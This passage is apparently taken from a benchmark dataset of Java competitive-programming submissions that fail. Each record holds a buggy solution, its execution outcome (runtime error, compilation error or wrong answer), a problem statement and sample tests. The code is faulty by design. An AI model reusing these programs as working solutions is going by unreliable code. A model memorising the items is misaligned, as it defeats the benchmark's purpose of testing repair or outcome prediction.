!tokenizer.hasMoreTokens()) {\n                try {\n                    tokenizer = new StringTokenizer(reader.readLine());\n                } catch (IOException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n            return tokenizer.nextToken();\n        }\n        public int nextInt() {\n            return Integer.parseInt(next());\n        }\n    }\n    static class Pair implements Comparable<Pair> {\n        int value, idx;\n        Pair(int v, int i)\n        {\n            value = v;\n            idx = i;\n        }\n        @Override\n        public int compareTo(Pair p) {\n            return value - p.value;\n        }\n    }\n    public static int[] bctsort(int[] array, int bucketCount) {\n        if (bucketCount <= 0) throw new IllegalArgumentException(\"Invalid bucket count\");\n        if (array.length <= 1) return array;\n        int high = array[0];\n        int low = array[0];\n        for (int i = 1; i < array.length; i++) {\n            if (array[i] > high) high = array[i];\n\n            if (array[i] < low) low = array[i];\n        }\n        double interval = ((double)(high - low + 1))\/bucketCount;\n        ArrayList<Integer> buckets[] = new ArrayList[bucketCount];\n        for (int i = 0; i < bucketCount; i++) {\n\n            buckets[i] = new ArrayList();\n\n        }\n        for (int i = 0; i < array.length; i++) {\n\n            buckets[(int)((array[i] - low)\/interval)].add(array[i]);\n        }\n        int pointer = 0;\n\n        for (int i = 0; i < buckets.length; i++) {\n\n            Collections.sort(buckets[i]);\n\n            for (int j = 0; j < buckets[i].size(); j++) {\n\n                array[pointer] = buckets[i].get(j);\n\n                pointer++;\n\n            }\n        }\n        return array;\n    }\n    \/*\n      int maxValueInMap=(Collections.max(mp.values()));  \/\/ This will return max value in the Hashmap\n        for (Map.Entry<String, Integer> entry : mp.entrySet()) {  \/\/ Itrate through hashmap\n            if (entry.getValue()==maxValueInMap) {\n                System.out.println(entry.getKey());\n                break;\n            }\n        }\n        \/\/vector of vector\n        ArrayList <Integer> al [] = (ArrayList <Integer> []) new ArrayList[100001];\n        Relatively Prime :- if diffrence between two number is equal to 1\n    *\/\n}","description":"Valera's lifelong ambition was to be a photographer, so he bought a new camera. Every day he got more and more clients asking for photos, and one day Valera needed a program that would determine the maximum number of people he can serve.The camera's memory is d megabytes. Valera's camera can take photos of high and low quality. One low quality photo takes a megabytes of memory, one high quality photo take b megabytes of memory. For unknown reasons, each client asks him to make several low quality photos and several high quality photos. More formally, the i-th client asks to make xi low quality photos and yi high quality photos.Valera wants to serve as many clients per day as possible, provided that they will be pleased with his work. To please the i-th client, Valera needs to give him everything he wants, that is, to make xi low quality photos and yi high quality photos. To make one low quality photo, the camera must have at least a megabytes of free memory space. Similarly, to make one high quality photo, the camera must have at least b megabytes of free memory space. Initially the camera's memory is empty. Valera also does not delete photos from the camera so that the camera's memory gradually fills up.Calculate the maximum number of clients Valera can successfully serve and print the numbers of these clients.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and d (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20091\u2009\u2264\u2009d\u2009\u2264\u2009109) \u2014 the number of clients and the camera memory size, correspondingly. The second line contains two integers a and b (1\u2009\u2264\u2009a\u2009\u2264\u2009b\u2009\u2264\u2009104) \u2014 the size of one low quality photo and of one high quality photo, correspondingly.  Next n lines describe the clients. The i-th line contains two integers xi and yi (0\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u2009105) \u2014 the number of low quality photos and high quality photos the i-th client wants, correspondingly.  All numbers on all lines are separated by single spaces. ","output_spec":"On the first line print the answer to the problem \u2014 the maximum number of clients that Valera can successfully serve. Print on the second line the numbers of the client in any order. All numbers must be distinct. If there are multiple answers, print any of them. The clients are numbered starting with 1 in the order in which they are defined in the input data.","notes":null,"sample_inputs":["3 10\n2 3\n1 4\n2 1\n1 0","3 6\n6 6\n1 1\n1 0\n1 0"],"sample_outputs":["2\n3 2","1\n2"]}
{"difficulty":1000,"lang":"Java 11","lang_cluster":"java","src_uid":"56da4ec7cd849c4330d188d8c9bd6094","submission_id":"re_234","tags":["two pointers","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"\nimport java.io.PrintWriter;\nimport java.util.HashSet;\nimport java.util.Scanner;\nimport java.util.Set;\nimport java.util.TreeSet;\n\npublic class TVSubscriptionsB extends PrintWriter {\n    \/\/this trick improves performances\n    TVSubscriptionsB() {\n        super(System.out);\n    }\n\n    public static void main(String[] $) {\n        TVSubscriptionsB o = new TVSubscriptionsB();\n        o.main();\n        o.flush();\n    }\n\n    void main() {\n        Scanner sc = new Scanner(System.in);\n        int count = sc.nextInt();\n        \/\/use this if just a single test\n        \/\/int count = 1;\n        while (count-- > 0) {\n            final int n = sc.nextInt();\n            final int k = sc.nextInt();\n            final int d = sc.nextInt();\n            final int[] shows = new int[n];\n            for (int i = 0; i < n; i++) {\n                shows[i]=sc.nextInt();\n            }\n            int min=Integer.MAX_VALUE;\n            for (int i = 0; i <= n-d; i++) {\n                final HashSet<Integer> set = new HashSet<>();\n                for (int j = 0; j < d ; j++) {\n                    set.add(shows[i+j]);\n                    if(set.size()>min){\n                        break;\n                    }\n                }\n                min=Math.min(min, set.size());\n            }\n            println(min);\n        }\n        sc.close();\n    }\n}\n","description":"The only difference between easy and hard versions is constraints.The BerTV channel every day broadcasts one episode of one of the $$$k$$$ TV shows. You know the schedule for the next $$$n$$$ days: a sequence of integers $$$a_1, a_2, \\dots, a_n$$$ ($$$1 \\le a_i \\le k$$$), where $$$a_i$$$ is the show, the episode of which will be shown in $$$i$$$-th day.The subscription to the show is bought for the entire show (i.e. for all its episodes), for each show the subscription is bought separately.How many minimum subscriptions do you need to buy in order to have the opportunity to watch episodes of purchased shows $$$d$$$ ($$$1 \\le d \\le n$$$) days in a row? In other words, you want to buy the minimum number of TV shows so that there is some segment of $$$d$$$ consecutive days in which all episodes belong to the purchased shows.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer $$$t$$$ ($$$1 \\le t \\le 100$$$) \u2014 the number of test cases in the input. Then $$$t$$$ test case descriptions follow. The first line of each test case contains three integers $$$n, k$$$ and $$$d$$$ ($$$1 \\le n \\le 100$$$, $$$1 \\le k \\le 100$$$, $$$1 \\le d \\le n$$$). The second line contains $$$n$$$ integers $$$a_1, a_2, \\dots, a_n$$$ ($$$1 \\le a_i \\le k$$$), where $$$a_i$$$ is the show that is broadcasted on the $$$i$$$-th day. It is guaranteed that the sum of the values \u200b\u200bof $$$n$$$ for all test cases in the input does not exceed $$$100$$$.","output_spec":"Print $$$t$$$ integers \u2014 the answers to the test cases in the input in the order they follow. The answer to a test case is the minimum number of TV shows for which you need to purchase a subscription so that you can watch episodes of the purchased TV shows on BerTV for $$$d$$$ consecutive days. Please note that it is permissible that you will be able to watch more than $$$d$$$ days in a row.","notes":"NoteIn the first test case to have an opportunity to watch shows for two consecutive days, you need to buy a subscription on show $$$1$$$ and on show $$$2$$$. So the answer is two.In the second test case, you can buy a subscription to any show because for each show you can find a segment of three consecutive days, consisting only of episodes of this show.In the third test case in the unique segment of four days, you have four different shows, so you need to buy a subscription to all these four shows.In the fourth test case, you can buy subscriptions to shows $$$3,5,7,8,9$$$, and you will be able to watch shows for the last eight days.","sample_inputs":["4\n5 2 2\n1 2 1 2 1\n9 3 3\n3 3 3 2 2 2 1 1 1\n4 10 4\n10 8 6 4\n16 9 8\n3 1 4 1 5 9 2 6 5 3 5 8 9 7 9 3"],"sample_outputs":["2\n1\n4\n5"]}
{"difficulty":1100,"lang":"Java 6","lang_cluster":"java","src_uid":"65fea461d3caa5a932d1e2c13e99a59e","submission_id":"re_998","tags":["math"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.util.Locale;\nimport java.util.Scanner;\n\npublic class ProblemA {\n\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        int n = sc.nextInt();\n        int b = sc.nextInt();\n        int[] ns = new int[n];\n        float[] cs = new float[n];\n        int max = 0;\n        boolean found = true;\n        for (int i = 0; i < n; i++) {\n            ns[i] = sc.nextInt();\n            max = Math.max(max, ns[i]);\n        }\n        for (int i = 0; i < n; i++) {\n            cs[i] = max - ns[i];\n            b -= cs[i];\n            if (b < 0) {\n                found = false;\n                break;\n            }\n        }\n        if(found){\n            for(int i = 0; i< n;i++){\n                System.out.println(String.format(Locale.ENGLISH, \"%1$.6f\", cs[i] + b \/ n));\n            }\n        }\n        else{\n            System.out.println(-1);\n        }\n    }\n}","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2009\u2264\u2009n\u2009\u2264\u2009100,\u20091\u2009\u2264\u2009b\u2009\u2264\u2009100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), where ai is the current volume of drink in the i-th mug.","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,\u2009c2,\u2009...,\u2009cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique. Russian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.","notes":null,"sample_inputs":["5 50\n1 2 3 4 5","2 2\n1 100"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000","-1"]}
{"difficulty":800,"lang":"Java 11","lang_cluster":"java","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_1178","tags":["implementation","brute force"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.util.Scanner;\nimport java.util.Arrays;\npublic class DomainPilling\n{\n    public static void main(String[]args){\n        Scanner input=new Scanner(System.in);\n        int t=input.nextInt();\n        int i,out,j;\n        out=1;\n        int counter=1;\n        for(i=0;i<t-1,i++){\n            out+=counter;\n            for(j=0;out>t;j++){\n                out-=j*t;\n            }\n            System.out.print(out+\" \");\n            counter+=1;\n            \n        }\n        System.out.println();\n        \n    }\n}","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1500,"lang":"Java 8","lang_cluster":"java","src_uid":"71b4674e91e0bc5521c416cfc570a090","submission_id":"re_404","tags":["implementation","greedy","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.util.*;\npublic class SysadminBob\n{\n\tpublic static void main(String[] args)\n\t{\n\t\tScanner sc=new Scanner(System.in);\n\t\tString s=sc.next();\n\t\tint flag=0;\n\t\tStringBuffer stb=new StringBuffer(s);\n\t\tif(s.charAt(0)=='@' || s.indexOf('@')==-1)\n\t\t{\n\t\t\tSystem.out.println(\"No solution\");\n\t\t}\n\t\t\n\t\telse\n\t\t{\n\t\t\tint k=0;\n\t\t\tfor(int i=0;i<s.length();i++)\n\t\t\t{\n\t\t\t\t\n\t\t\t\tint temp=s.indexOf('@',k);\n\t\t\t\tif(temp==-1 || s.indexOf('@',temp+1)==-1)\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\/\/\t\t\t\tSystem.out.println(\"temp:\"+temp);\n\/\/\t\t\t\tSystem.out.println(\"temp+2:\" +(temp+2));\n\t\t\t\tstb.insert(temp+2, ',');\n\t\t\t\ts=stb.toString();\n\t\t\t\tk=temp+1;\n\t\t\t\ti=k;\n\t\t\t}\n\t\t\/\/\tSystem.out.println(s);\n\t\t\t\n\t\t\tfor(int i=0;i<s.length();i++)\n\t\t\t{\n\t\t\t\tif((s.charAt(i)=='@' && s.charAt(i-1)==',') ||( s.charAt(i)=='@' && s.charAt(i+1)=='@' ))\n\t\t\t\t{\n\t\t\t\t\tSystem.out.println(\"No solution\");\n\t\t\t\t\tflag=1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(flag==0)\n\t\t\t{\n\t\t\t\tif(s.charAt(s.length()-1)==',')\n\t\t\t\t{\n\t\t\t\t\tSystem.out.println(s.substring(0,s.length()-1));\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tSystem.out.println(s);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n","description":"Email address in Berland is a string of the form A@B, where A and B are arbitrary strings consisting of small Latin letters. Bob is a system administrator in \u00abBersoft\u00bb company. He keeps a list of email addresses of the company's staff. This list is as a large string, where all addresses are written in arbitrary order, separated by commas. The same address can be written more than once.Suddenly, because of unknown reasons, all commas in Bob's list disappeared. Now Bob has a string, where all addresses are written one after another without any separators, and there is impossible to determine, where the boundaries between addresses are. Unfortunately, on the same day his chief asked him to bring the initial list of addresses. Now Bob wants to disjoin addresses in some valid way. Help him to do that.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the list of addresses without separators. The length of this string is between 1 and 200, inclusive. The string consists only from small Latin letters and characters \u00ab@\u00bb.","output_spec":"If there is no list of the valid (according to the Berland rules) email addresses such that after removing all commas it coincides with the given string, output No solution. In the other case, output the list. The same address can be written in this list more than once. If there are several solutions, output any of them.","notes":null,"sample_inputs":["a@aa@a","a@a@a","@aa@a"],"sample_outputs":["a@a,a@a","No solution","No solution"]}
{"difficulty":1300,"lang":"Java 8","lang_cluster":"java","src_uid":"782b819eb0bfc86d6f96f15ac09d5085","submission_id":"re_815","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.util.Scanner;\n\npublic class CF185A {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        long n = scanner.nextLong();\n        long result = 1;\n        for(long i = 0; i < n; i++){\n            result = result*3;\n            if(i>=1){\n                result += (n-1);\n            }\n        }\n        System.out.println(result);\n    }\n}","description":"Dwarfs have planted a very interesting plant, which is a triangle directed \"upwards\". This plant has an amusing feature. After one year a triangle plant directed \"upwards\" divides into four triangle plants: three of them will point \"upwards\" and one will point \"downwards\". After another year, each triangle plant divides into four triangle plants: three of them will be directed in the same direction as the parent plant, and one of them will be directed in the opposite direction. Then each year the process repeats. The figure below illustrates this process.  Help the dwarfs find out how many triangle plants that point \"upwards\" will be in n years.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (0\u2009\u2264\u2009n\u2009\u2264\u20091018) \u2014 the number of full years when the plant grew. Please do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"Print a single integer \u2014 the remainder of dividing the number of plants that will point \"upwards\" in n years by 1000000007 (109\u2009+\u20097).","notes":"NoteThe first test sample corresponds to the second triangle on the figure in the statement. The second test sample corresponds to the third one.","sample_inputs":["1","2"],"sample_outputs":["3","10"]}
{"difficulty":1300,"lang":"Java 11","lang_cluster":"java","src_uid":"8c26daa1eed2078af3b32737da0a0f84","submission_id":"re_913","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner kb = new Scanner(System.in);\n        String N = kb.nextLine();\n        StringBuilder sb = new StringBuilder(N);\n        for(int i = 0; i < sb.length(); i++) {\n            if(sb.charAt(i) == ' ') {\n                if(sb.charAt(i+1) == ' ') {\n                    sb.deleteCharAt(i+1);\n                    i--;\n                    continue;\n                }\n            }\n            if(sb.charAt(i) == ',' || sb.charAt(i) == ',' || sb.charAt(i) == '!' || sb.charAt(i) == '?') {\n                if(sb.charAt(i+1) != ' ') {\n                    sb.insert(i+1, ' ');\n                }\n                if(sb.charAt(i-1) == ' ') {\n                    sb.deleteCharAt(i-1);\n                    i--;\n                }\n            }\n        }\n        System.out.println(sb.toString());\n    }\n}\n","description":"You are given a text that consists of lowercase Latin letters, spaces and punctuation marks (dot, comma, exclamation mark and question mark). A word is defined as a sequence of consecutive Latin letters.Your task is to add spaces to the text by the following rules:  if there is no punctuation mark between two words, then they should be separated by exactly one space  there should be no spaces before each punctuation mark  there should be exactly one space after each punctuation mark It is guaranteed that there is at least one word between any two punctuation marks. The text begins and ends with a Latin letter.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains of a single non-empty line \u2014 the text whose length is no more than 10000 characters.","output_spec":"Print the text, edited according to the rules. In this problem you should follow the output format very strictly. For example, extra space at the end of the output line is considered as wrong answer. Note that a newline character at the end of the line doesn't matter.","notes":null,"sample_inputs":["galileo galilei was an   italian physicist  ,mathematician,astronomer","galileo  was  born  in  pisa"],"sample_outputs":["galileo galilei was an italian physicist, mathematician, astronomer","galileo was born in pisa"]}
{"difficulty":900,"lang":"Java 8","lang_cluster":"java","src_uid":"8e0581cce19d6bf5eba30a0aebee9a08","submission_id":"re_298","tags":["sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.StringTokenizer;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\n\/**\n *\n * @author Suptee\n *\/\npublic class Arrays_572A {\n\n    \/**\n     * @param args the command line arguments\n     *\/\n    public static void main(String[] args) {\n        try {\n            BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n            StringTokenizer st = new StringTokenizer(br.readLine());\n\n            int nA = Integer.parseInt(st.nextToken());\n            int nB = Integer.parseInt(st.nextToken());\n            \n            int[] arrayA = new int[nA];\n            int[] arrayB = new int[nB];\n            \n            StringTokenizer st1 = new StringTokenizer(br.readLine());\n            int k = Integer.parseInt(st1.nextToken());\n            int m = Integer.parseInt(st1.nextToken());\n            \n            StringTokenizer st2 = new StringTokenizer(br.readLine());\n            int i = 0;\n            while (st2.hasMoreTokens() && i < nA) {\n                arrayA[i] = Integer.parseInt(st2.nextToken());\n                \/\/System.out.println(\"arrayA : \"+arrayA[i]);\n                i++;\n            }\n            \n            StringTokenizer st3 = new StringTokenizer(br.readLine());\n            int j = 0;\n            while (st3.hasMoreTokens() && j < nB) {\n                arrayB[j] = Integer.parseInt(st3.nextToken());\n               \/\/ System.out.println(\"arrayB : \"+arrayB[j]);\n                j++;\n            }\n            \n            int count = 0;\n            for (int indexA = 0; indexA < k; indexA++) {\n                for(int indexB = nB - 1; indexB >= (nB - m); indexB --) {\n                    if(arrayA[indexA] < arrayB[indexB]) {\n                        count++;\n                    }\n                }\n            }\n            \n            if(count == k) {\n                System.out.println(\"YES\");\n            }\n            else {\n                System.out.println(\"NO\");\n            }\n            \n        } catch (IOException ex) {\n            Logger.getLogger(Arrays_572A.class.getName()).log(Level.SEVERE, null, ex);\n        }\n    }\n    \n}","description":"You are given two arrays A and B consisting of integers, sorted in non-decreasing order. Check whether it is possible to choose k numbers in array A and choose m numbers in array B so that any number chosen in the first array is strictly less than any number chosen in the second array.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers nA,\u2009nB (1\u2009\u2264\u2009nA,\u2009nB\u2009\u2264\u2009105), separated by a space \u2014 the sizes of arrays A and B, correspondingly. The second line contains two integers k and m (1\u2009\u2264\u2009k\u2009\u2264\u2009nA,\u20091\u2009\u2264\u2009m\u2009\u2264\u2009nB), separated by a space. The third line contains nA numbers a1,\u2009a2,\u2009... anA (\u2009-\u2009109\u2009\u2264\u2009a1\u2009\u2264\u2009a2\u2009\u2264\u2009...\u2009\u2264\u2009anA\u2009\u2264\u2009109), separated by spaces \u2014 elements of array A. The fourth line contains nB integers b1,\u2009b2,\u2009... bnB (\u2009-\u2009109\u2009\u2264\u2009b1\u2009\u2264\u2009b2\u2009\u2264\u2009...\u2009\u2264\u2009bnB\u2009\u2264\u2009109), separated by spaces \u2014 elements of array B.","output_spec":"Print \"YES\" (without the quotes), if you can choose k numbers in array A and m numbers in array B so that any number chosen in array A was strictly less than any number chosen in array B. Otherwise, print \"NO\" (without the quotes).","notes":"NoteIn the first sample test you can, for example, choose numbers 1 and 2 from array A and number 3 from array B (1 &lt; 3 and 2 &lt; 3).In the second sample test the only way to choose k elements in the first array and m elements in the second one is to choose all numbers in both arrays, but then not all the numbers chosen in A will be less than all the numbers chosen in B: .","sample_inputs":["3 3\n2 1\n1 2 3\n3 4 5","3 3\n3 3\n1 2 3\n3 4 5","5 2\n3 1\n1 1 1 1 1\n2 2"],"sample_outputs":["YES","NO","YES"]}
{"difficulty":800,"lang":"Java 8","lang_cluster":"java","src_uid":"930be5ec102fbe062062aa23eac75187","submission_id":"re_198","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashSet;\nimport java.util.Scanner;\n\npublic class SecOrderStatics {\n\n\tpublic static void main(String[] args) {\n\t\tScanner scan = new Scanner(System.in);\n\t\tint n =scan.nextInt();\n\t\tint[] a= new int[n];\n\t\tHashSet h= new HashSet();\n\t\tfor(int i=0;i<n;i++)\n\t\t{\n\t\t\ta[i]=scan.nextInt();\n\t\t}\n\t\tArrays.sort(a);\n\t\tArrayList al=new ArrayList();\n\t\tfor(int i=0;i<n;i++)\n\t\t{\n\t\t\tif(h.contains(a[i]))\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tal.add(a[i]);\n\t\t\th.add(a[i]);\n\t\t}\n\t\tif(n>2)\n\t\t{\n\t\t\tSystem.out.println(al.get(1));\n\t\t}\n\t\telse System.out.println(\"NO\");\n\t}\n\t\n\n}\n","description":"Once Bob needed to find the second order statistics of a sequence of integer numbers. Lets choose each number from the sequence exactly once and sort them. The value on the second position is the second order statistics of the given sequence. In other words it is the smallest element strictly greater than the minimum. Help Bob solve this problem.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of numbers in the sequence. The second line contains n space-separated integer numbers \u2014 elements of the sequence. These numbers don't exceed 100 in absolute value.","output_spec":"If the given sequence has the second order statistics, output this order statistics, otherwise output NO.","notes":null,"sample_inputs":["4\n1 2 2 -4","5\n1 2 3 1 1"],"sample_outputs":["1","2"]}
{"difficulty":1500,"lang":"Java 6","lang_cluster":"java","src_uid":"9642368dc4ffe2fc6fe6438c7406c1bd","submission_id":"re_1256","tags":["dp","combinatorics","math","binary search","brute force"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.util.Scanner;\n\n\npublic class main {\n       \n    \/**\n     * @param args\n     *\/\n    public static void main(String[] args) {\n        \/\/ TODO Auto-generated method stub\n         Scanner in = new Scanner(System.in);\n         long l=in.nextLong();\n         long r=in.nextLong();\n         String s=Long.toString(r);\n         \n         long x;\n         if(r<10)x=r;\n         else\n         {boolean flag=false;\n         while(s.charAt(0)!=s.charAt(s.length()-1))\n          {   s=Long.toString(r);\n              r--;\n              s=Long.toString(r);\n              flag=true;\n          }\n         if(flag)\n           x=r\/10+9;\n         else x=r\/10+10;\n         }\n         long y=0;\n         if(l<10)y=l-1;\n         else\n         {   s=Long.toString(l);\n             \n             while(s.charAt(0)!=s.charAt(s.length()-1))\n             {\n                 l--;\n                 s=Long.toString(l);\n                \n             }\n        \n                   y=l\/10+9;\n                \n             \n             \n         }\n        System.out.println(x-y);\n    }\n\n}\n","description":"The Little Elephant very much loves sums on intervals.This time he has a pair of integers l and r (l\u2009\u2264\u2009r). The Little Elephant has to find the number of such integers x (l\u2009\u2264\u2009x\u2009\u2264\u2009r), that the first digit of integer x equals the last one (in decimal notation). For example, such numbers as 101, 477474 or 9 will be included in the answer and 47, 253 or 1020 will not.Help him and count the number of described numbers x for a given pair l and r.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains a pair of integers l and r (1\u2009\u2264\u2009l\u2009\u2264\u2009r\u2009\u2264\u20091018) \u2014 the boundaries of the interval. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"On a single line print a single integer \u2014 the answer to the problem.","notes":"NoteIn the first sample the answer includes integers 2, 3, 4, 5, 6, 7, 8, 9, 11, 22, 33, 44. ","sample_inputs":["2 47","47 1024"],"sample_outputs":["12","98"]}
{"difficulty":900,"lang":"Java 8","lang_cluster":"java","src_uid":"9a56288d8bd4e4e7ef3329e102f745a5","submission_id":"re_385","tags":["sortings","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"\nimport org.w3c.dom.ls.LSOutput;\n\nimport java.lang.reflect.Array;\nimport java.util.Arrays;\nimport java.util.HashSet;\nimport java.util.Scanner;\n\n\npublic class Main {\n    public static void main(String[] args) {\n            Scanner sc = new Scanner(System.in);\n\n            int m =sc.nextInt() ,n =sc.nextInt();\n            int a [] = new int[m];\n\n            for(int i=0;i<m;i++){\n                a[i] = sc.nextInt();\n            }\n\n            Arrays.sort(a);\n     int sum = 0;\n        for(int i=0;i<n;i++){\n            if(a[i]<=0)\n                sum+= Math.abs(a[i]);\n            else {\n                sum-=a[i];\n            }\n        }\n\n        System.out.println(sum);\n\n\n\n\n    }\n}\n","description":"Once Bob got to a sale of old TV sets. There were n TV sets at that sale. TV set with index i costs ai bellars. Some TV sets have a negative price \u2014 their owners are ready to pay Bob if he buys their useless apparatus. Bob can \u00abbuy\u00bb any TV sets he wants. Though he's very strong, Bob can carry at most m TV sets, and he has no desire to go to the sale for the second time. Please, help Bob find out the maximum sum of money that he can earn.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and m (1\u2009\u2264\u2009m\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of TV sets at the sale, and amount of TV sets that Bob can carry. The following line contains n space-separated integers ai (\u2009-\u20091000\u2009\u2264\u2009ai\u2009\u2264\u20091000) \u2014 prices of the TV sets. ","output_spec":"Output the only number \u2014 the maximum sum of money that Bob can earn, given that he can carry at most m TV sets.","notes":null,"sample_inputs":["5 3\n-6 0 35 -2 4","4 2\n7 0 0 -7"],"sample_outputs":["8","7"]}
{"difficulty":1400,"lang":"Java 8","lang_cluster":"java","src_uid":"a37df9b239a40473516d1525d56a0da7","submission_id":"re_351","tags":["combinatorics"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.DataInputStream;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\n\/**\n * @author johnny16\n *\n *\/\npublic class PocketBook {\n\tstatic int mod = 1000000007;\n\n\tstatic class Reader {\n\t\tfinal private int BUFFER_SIZE = 1 << 16;\n\t\tprivate DataInputStream din;\n\t\tprivate byte[] buffer;\n\t\tprivate int bufferPointer, bytesRead;\n\n\t\tpublic Reader() {\n\t\t\tdin = new DataInputStream(System.in);\n\t\t\tbuffer = new byte[BUFFER_SIZE];\n\t\t\tbufferPointer = bytesRead = 0;\n\t\t}\n\n\t\tpublic Reader(String file_name) throws IOException {\n\t\t\tdin = new DataInputStream(new FileInputStream(file_name));\n\t\t\tbuffer = new byte[BUFFER_SIZE];\n\t\t\tbufferPointer = bytesRead = 0;\n\t\t}\n\n\t\tpublic String readLine() throws IOException {\n\t\t\tbyte[] buf = new byte[64]; \/\/ line length\n\t\t\tint cnt = 0, c;\n\t\t\twhile ((c = read()) != -1) {\n\t\t\t\tif (c == '\\n')\n\t\t\t\t\tbreak;\n\t\t\t\tbuf[cnt++] = (byte) c;\n\t\t\t}\n\t\t\treturn new String(buf, 0, cnt);\n\t\t}\n\n\t\tpublic int nextInt() throws IOException {\n\t\t\tint ret = 0;\n\t\t\tbyte c = read();\n\t\t\twhile (c <= ' ')\n\t\t\t\tc = read();\n\t\t\tboolean neg = (c == '-');\n\t\t\tif (neg)\n\t\t\t\tc = read();\n\t\t\tdo {\n\t\t\t\tret = ret * 10 + c - '0';\n\t\t\t} while ((c = read()) >= '0' && c <= '9');\n\n\t\t\tif (neg)\n\t\t\t\treturn -ret;\n\t\t\treturn ret;\n\t\t}\n\n\t\tpublic long nextLong() throws IOException {\n\t\t\tlong ret = 0;\n\t\t\tbyte c = read();\n\t\t\twhile (c <= ' ')\n\t\t\t\tc = read();\n\t\t\tboolean neg = (c == '-');\n\t\t\tif (neg)\n\t\t\t\tc = read();\n\t\t\tdo {\n\t\t\t\tret = ret * 10 + c - '0';\n\t\t\t} while ((c = read()) >= '0' && c <= '9');\n\t\t\tif (neg)\n\t\t\t\treturn -ret;\n\t\t\treturn ret;\n\t\t}\n\n\t\tpublic double nextDouble() throws IOException {\n\t\t\tdouble ret = 0, div 